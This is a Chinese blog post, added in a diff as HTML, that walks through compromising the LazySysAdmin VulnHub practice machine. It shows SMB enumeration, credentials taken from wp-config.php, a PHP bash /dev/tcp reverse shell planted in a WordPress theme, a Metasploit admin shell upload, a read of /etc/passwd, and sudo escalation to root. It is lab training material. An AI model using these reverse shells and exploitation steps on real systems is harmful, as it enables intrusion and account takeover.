@@ -1,0 +1,238 @@
+<!DOCTYPE html><html lang="zh_CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no"><title>Lazysysadmin | 牛牛的blog</title><meta name="author" content="牛牛"><meta name="copyright" content="牛牛"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="Lazysysadmin1.端口扫描 开放了22，80，139，445，3306，6667端口 其中139和445端口是smb服务 2.web渗透没什么内容，dirb扫出有wordpress，但没有账户密码 3.smb服务1smbclient -L 192.168.152.132   相关参数：    -L 显示服务器端所分享出来的所有资源    -U 指定用户名称   -s 指定smb.conf">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Lazysysadmin">
+<meta property="og:url" content="http://example.com/2023/03/10/%E9%9D%B6%E5%9C%BA/lazysysadmin/index.html">
+<meta property="og:site_name" content="牛牛的blog">
+<meta property="og:description" content="Lazysysadmin1.端口扫描 开放了22，80，139，445，3306，6667端口 其中139和445端口是smb服务 2.web渗透没什么内容，dirb扫出有wordpress，但没有账户密码 3.smb服务1smbclient -L 192.168.152.132   相关参数：    -L 显示服务器端所分享出来的所有资源    -U 指定用户名称   -s 指定smb.conf">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7">
+<meta property="article:published_time" content="2023-03-10T06:58:06.887Z">
+<meta property="article:modified_time" content="2023-03-10T07:58:11.606Z">
+<meta property="article:author" content="牛牛">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7"><link rel="shortcut icon" href="/img/favicon.png"><link rel="canonical" href="http://example.com/2023/03/10/%E9%9D%B6%E5%9C%BA/lazysysadmin/"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox.min.css" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = { 
+  root: '/',
+  algolia: undefined,
+  localSearch: undefined,
+  translate: undefined,
+  noticeOutdate: undefined,
+  highlight: {"plugin":"highlighjs","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false},
+  copy: {
+    success: 'Copy successfully',
+    error: 'Copy error',
+    noSupport: 'The browser does not support'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: 'days',
+  date_suffix: {
+    just: 'Just',
+    min: 'minutes ago',
+    hour: 'hours ago',
+    day: 'days ago',
+    month: 'months ago'
+  },
+  copyright: undefined,
+  lightbox: 'fancybox',
+  Snackbar: undefined,
+  source: {
+    justifiedGallery: {
+      js: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery/dist/fjGallery.min.js',
+      css: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery/dist/fjGallery.min.css'
+    }
+  },
+  isPhotoFigcaption: false,
+  islazyload: false,
+  isAnchor: false
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  title: 'Lazysysadmin',
+  isPost: true,
+  isHome: false,
+  isHighlightShrink: false,
+  isToc: true,
+  postUpdate: '2023-03-10 15:58:11'
+}</script><noscript><style type="text/css">
+  #nav {
+    opacity: 1
+  }
+  .justified-gallery img {
+    opacity: 1
+  }
+
+  #recent-posts time,
+  #post-meta time {
+    display: inline !important
+  }
+</style></noscript><script>(win=>{
+    win.saveToLocal = {
+      set: function setWithExpiry(key, value, ttl) {
+        if (ttl === 0) return
+        const now = new Date()
+        const expiryDay = ttl * 86400000
+        const item = {
+          value: value,
+          expiry: now.getTime() + expiryDay,
+        }
+        localStorage.setItem(key, JSON.stringify(item))
+      },
+
+      get: function getWithExpiry(key) {
+        const itemStr = localStorage.getItem(key)
+
+        if (!itemStr) {
+          return undefined
+        }
+        const item = JSON.parse(itemStr)
+        const now = new Date()
+
+        if (now.getTime() > item.expiry) {
+          localStorage.removeItem(key)
+          return undefined
+        }
+        return item.value
+      }
+    }
+  
+    win.getScript = url => new Promise((resolve, reject) => {
+      const script = document.createElement('script')
+      script.src = url
+      script.async = true
+      script.onerror = reject
+      script.onload = script.onreadystatechange = function() {
+        const loadState = this.readyState
+        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+        script.onload = script.onreadystatechange = null
+        resolve()
+      }
+      document.head.appendChild(script)
+    })
+  
+      win.activateDarkMode = function () {
+        document.documentElement.setAttribute('data-theme', 'dark')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+        }
+      }
+      win.activateLightMode = function () {
+        document.documentElement.setAttribute('data-theme', 'light')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
+        }
+      }
+      const t = saveToLocal.get('theme')
+    
+          if (t === 'dark') activateDarkMode()
+          else if (t === 'light') activateLightMode()
+        
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        if (asideStatus === 'hide') {
+          document.documentElement.classList.add('hide-aside')
+        } else {
+          document.documentElement.classList.remove('hide-aside')
+        }
+      }
+    
+    const detectApple = () => {
+      if(/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
+        document.documentElement.classList.add('apple')
+      }
+    }
+    detectApple()
+    })(window)</script><meta name="generator" content="Hexo 5.4.2"></head><body><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src="https://files.catbox.moe/dbtw19.jpeg" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="sidebar-site-data site-data is-center"><a href="/archives/"><div class="headline">Articles</div><div class="length-num">26</div></a><a href="/tags/"><div class="headline">Tags</div><div class="length-num">3</div></a><a href="/categories/"><div class="headline">Categories</div><div class="length-num">1</div></a></div><hr/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 时间轴</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 目录</span></a></div><div class="menus_item"><a class="site-page group" href="javascript:void(0);"><i class="fa-fw fas fa-list"></i><span> 列表</span><i class="fas fa-chevron-down"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/music/"><i class="fa-fw fas fa-music"></i><span> Music</span></a></li><li><a class="site-page child" href="/movies/"><i class="fa-fw fas fa-video"></i><span> Movie</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 链接</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url('data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7')"><nav id="nav"><span id="blog_name"><a id="site-name" href="/">牛牛的blog</a></span><div id="menus"><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 时间轴</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 目录</span></a></div><div class="menus_item"><a class="site-page group" href="javascript:void(0);"><i class="fa-fw fas fa-list"></i><span> 列表</span><i class="fas fa-chevron-down"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/music/"><i class="fa-fw fas fa-music"></i><span> Music</span></a></li><li><a class="site-page child" href="/movies/"><i class="fa-fw fas fa-video"></i><span> Movie</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 链接</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于</span></a></div></div><div id="toggle-menu"><a class="site-page"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">Lazysysadmin</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">Created</span><time class="post-meta-date-created" datetime="2023-03-10T06:58:06.887Z" title="Created 2023-03-10 14:58:06">2023-03-10</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">Updated</span><time class="post-meta-date-updated" datetime="2023-03-10T07:58:11.606Z" title="Updated 2023-03-10 15:58:11">2023-03-10</time></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title="Lazysysadmin"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">Post View:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><h1 id="Lazysysadmin"><a href="#Lazysysadmin" class="headerlink" title="Lazysysadmin"></a>Lazysysadmin</h1><h2 id="1-端口扫描"><a href="#1-端口扫描" class="headerlink" title="1.端口扫描"></a>1.端口扫描</h2><p><img src="/2023/03/10/%E9%9D%B6%E5%9C%BA/lazysysadmin/image-20230310150428411.png" alt="image-20230310150428411"></p>
+<p>开放了22，80，139，445，3306，6667端口</p>
+<p>其中139和445端口是smb服务</p>
+<h2 id="2-web渗透"><a href="#2-web渗透" class="headerlink" title="2.web渗透"></a>2.web渗透</h2><p>没什么内容，dirb扫出有wordpress，但没有账户密码</p>
+<h2 id="3-smb服务"><a href="#3-smb服务" class="headerlink" title="3.smb服务"></a>3.smb服务</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">smbclient -L 192.168.152.132</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>相关参数：</p>
+<table>
+<thead>
+<tr>
+<th>-L</th>
+<th align="left">显示服务器端所分享出来的所有资源</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>-U</td>
+<td align="left">指定用户名称</td>
+</tr>
+<tr>
+<td>-s</td>
+<td align="left">指定smb.conf所在的目录</td>
+</tr>
+<tr>
+<td>-O</td>
+<td align="left">设置用户端TCP连接槽的选项</td>
+</tr>
+<tr>
+<td>-N</td>
+<td align="left">不用询问密码</td>
+</tr>
+</tbody></table>
+</blockquote>
+<p><img src="/2023/03/10/%E9%9D%B6%E5%9C%BA/lazysysadmin/image-20230310152019961.png" alt="image-20230310152019961"></p>
+<p>我们近share$共享文件夹看一下：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">smbclient //192.168.152.150/share$</span><br><span class="line">ls</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2023/03/10/%E9%9D%B6%E5%9C%BA/lazysysadmin/image-20230310152116737.png" alt="image-20230310152116737"></p>
+<p>可以看到wordpress目录（可能存在登录凭证），和一些txt文件（可能包含提示）</p>
+<p>下载txt文件：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mget *.txt</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2023/03/10/%E9%9D%B6%E5%9C%BA/lazysysadmin/image-20230310152249013.png" alt="image-20230310152249013"></p>
+<p>进入wordpress目录，对配置文件进行下载</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cd wordpress</span><br><span class="line">get wp-config.php</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2023/03/10/%E9%9D%B6%E5%9C%BA/lazysysadmin/image-20230310152434438.png" alt="image-20230310152434438"></p>
+<p>查看三个txt文件：</p>
+<p><img src="/2023/03/10/%E9%9D%B6%E5%9C%BA/lazysysadmin/image-20230310152629284.png" alt="image-20230310152629284"></p>
+<p>deet.txt提供了一个密码<code>12345</code><br>robots.txt应该是为了防止爬虫用的<br>todolist.txt表示禁止用户用本地文件浏览器浏览web root</p>
+<p>再看看wordpress配置文件</p>
+<p><img src="/2023/03/10/%E9%9D%B6%E5%9C%BA/lazysysadmin/image-20230310152905447.png" alt="image-20230310152905447"></p>
+<p>存在登录凭证，username：<code>admin</code>，password：<code>TogieMYSQL12345^^</code></p>
+<h2 id="4-wordpress-exploit"><a href="#4-wordpress-exploit" class="headerlink" title="4.wordpress_exploit"></a>4.wordpress_exploit</h2><h3 id="1-直接插入反弹shell一句话（失败）"><a href="#1-直接插入反弹shell一句话（失败）" class="headerlink" title="1.直接插入反弹shell一句话（失败）"></a>1.直接插入反弹shell一句话（失败）</h3><p>刚刚我们目录扫描到了wordpress的管理员登录页面，用我们获得的凭证进行登录</p>
+<p>之前做过一个靶场，有点经验，直接找到可以修改php文件的位置，</p>
+<p><img src="/2023/03/10/%E9%9D%B6%E5%9C%BA/lazysysadmin/image-20230310153433394.png" alt="image-20230310153433394"></p>
+<p>这里有一些php文件，可以执行我们的反弹shell，</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">exec(&quot;bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;192.168.152.132&#x2F;1234 0&gt;&amp;1&quot;);</span><br><span class="line">php&gt;</span><br></pre></td></tr></table></figure>
+
+<p>保存后，进行访问，访问的地址是</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">192.168.152.150&#x2F;wordpress&#x2F;wp-content&#x2F;themes&#x2F;twentynineteen&#x2F;xxx.php</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>/twentyfifteen/xxx.php不是固定的，在下图可以找到</p>
+</blockquote>
+<p><img src="/2023/03/10/%E9%9D%B6%E5%9C%BA/lazysysadmin/image-20230310153853793.png" alt="image-20230310153853793"></p>
+<p>同时kali机开启端口监听</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -lvnp 1234</span><br></pre></td></tr></table></figure>
+
+<p>但是翻车了，访问的页面好像不会进行解析，反弹shell无效</p>
+<h3 id="2-MSF执行"><a href="#2-MSF执行" class="headerlink" title="2.MSF执行"></a>2.MSF执行</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">msfconsle</span><br><span class="line">use expolit&#x2F;unix&#x2F;webapp&#x2F;wp_admin_shell_upload</span><br><span class="line">set rhosts 192.168.152.150</span><br><span class="line">set targeturi &#x2F;wordpress </span><br><span class="line">set username admin </span><br><span class="line">set password TogieMYSQL12345^^ </span><br><span class="line">exploit</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2023/03/10/%E9%9D%B6%E5%9C%BA/lazysysadmin/image-20230310154438817.png" alt="image-20230310154438817"></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sysinfo</span><br><span class="line">shell</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2023/03/10/%E9%9D%B6%E5%9C%BA/lazysysadmin/image-20230310154543360.png" alt="image-20230310154543360"></p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat /etc/passwd</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2023/03/10/%E9%9D%B6%E5%9C%BA/lazysysadmin/image-20230310154631877.png" alt="image-20230310154631877"></p>
+<p>我们看到了熟悉togie，试试用他能不能登录，别忘了我们还有一个密码<code>12345</code>还没用</p>
+<p>使用 python 的 pty 来转换为 交互式shell</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -c &#x27;import pty; pty.spawn(&quot;/bin/bash&quot;)&#x27;</span><br></pre></td></tr></table></figure>
+
+<p>切换用户，密码12345</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">su togie</span><br><span class="line">或者</span><br><span class="line">su - togie</span><br><span class="line"><span class="meta">#</span><span class="bash">两者的区别在于 su username 切换用户后，不会改变原用户的工作目录和环境变量目录。而su - username 切换用户后，工作环境会同时切换到新用户的环境中。</span></span><br></pre></td></tr></table></figure>
+
+<p>查看togie的权限</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo -l</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2023/03/10/%E9%9D%B6%E5%9C%BA/lazysysadmin/image-20230310155306053.png" alt="image-20230310155306053"></p>
+<p>三个ALL，也不用进一步提权了</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo su</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2023/03/10/%E9%9D%B6%E5%9C%BA/lazysysadmin/image-20230310155408384.png" alt="image-20230310155408384"></p>
+</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">Author: </span><span class="post-copyright-info"><a href="http://example.com">牛牛</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">Link: </span><span class="post-copyright-info"><a href="http://example.com/2023/03/10/%E9%9D%B6%E5%9C%BA/lazysysadmin/">http://example.com/2023/03/10/%E9%9D%B6%E5%9C%BA/lazysysadmin/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">Copyright Notice: </span><span class="post-copyright-info">All articles in this blog are licensed under <a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/">CC BY-NC-SA 4.0</a> unless stating additionally.</span></div></div><div class="tag_share"><div class="post-meta__tag-list"></div><div class="post_share"><div class="social-share" data-image="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-left"><a href="/2023/03/13/%E9%9D%B6%E5%9C%BA/toppo/"><img class="prev-cover" src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="onerror=null;src='/img/404.jpg'" alt="cover of previous post"><div class="pagination-info"><div class="label">Previous Post</div><div class="prev_info">Vunlhub-Toppo1</div></div></a></div><div class="next-post pull-right"><a href="/2023/03/05/%E9%9D%B6%E5%9C%BA/NullByte/"><img class="next-cover" src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="onerror=null;src='/img/404.jpg'" alt="cover of next post"><div class="pagination-info"><div class="label">Next Post</div><div class="next_info"></div></div></a></div></nav></div><div class="aside-content" id="aside-content"><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>Catalog</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#Lazysysadmin"><span class="toc-number">1.</span> <span class="toc-text">Lazysysadmin</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#1-%E7%AB%AF%E5%8F%A3%E6%89%AB%E6%8F%8F"><span class="toc-number">1.1.</span> <span class="toc-text">1.端口扫描</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#2-web%E6%B8%97%E9%80%8F"><span class="toc-number">1.2.</span> <span class="toc-text">2.web渗透</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#3-smb%E6%9C%8D%E5%8A%A1"><span class="toc-number">1.3.</span> <span class="toc-text">3.smb服务</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#4-wordpress-exploit"><span class="toc-number">1.4.</span> <span class="toc-text">4.wordpress_exploit</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-%E7%9B%B4%E6%8E%A5%E6%8F%92%E5%85%A5%E5%8F%8D%E5%BC%B9shell%E4%B8%80%E5%8F%A5%E8%AF%9D%EF%BC%88%E5%A4%B1%E8%B4%A5%EF%BC%89"><span class="toc-number">1.4.1.</span> <span class="toc-text">1.直接插入反弹shell一句话（失败）</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-MSF%E6%89%A7%E8%A1%8C"><span class="toc-number">1.4.2.</span> <span class="toc-text">2.MSF执行</span></a></li></ol></li></ol></li></ol></div></div></div></div></main><footer id="footer"><div id="footer-wrap"><div class="copyright">&copy;2020 - 2023 By 牛牛</div><div class="framework-info"><span>Framework </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>Theme </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="Read Mode"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="Toggle Between Light And Dark Mode"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="Toggle between single-column and double-column"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside_config" type="button" title="Setting"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="Table Of Contents"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="Back To Top"><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox.umd.min.js"></script><div class="js-pjax"></div><canvas class="fireworks" mobile="false"></canvas><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/dist/fireworks.min.js"></script><script defer="defer" id="fluttering_ribbon" mobile="false" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/dist/canvas-fluttering-ribbon.min.js"></script><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div></body></html>
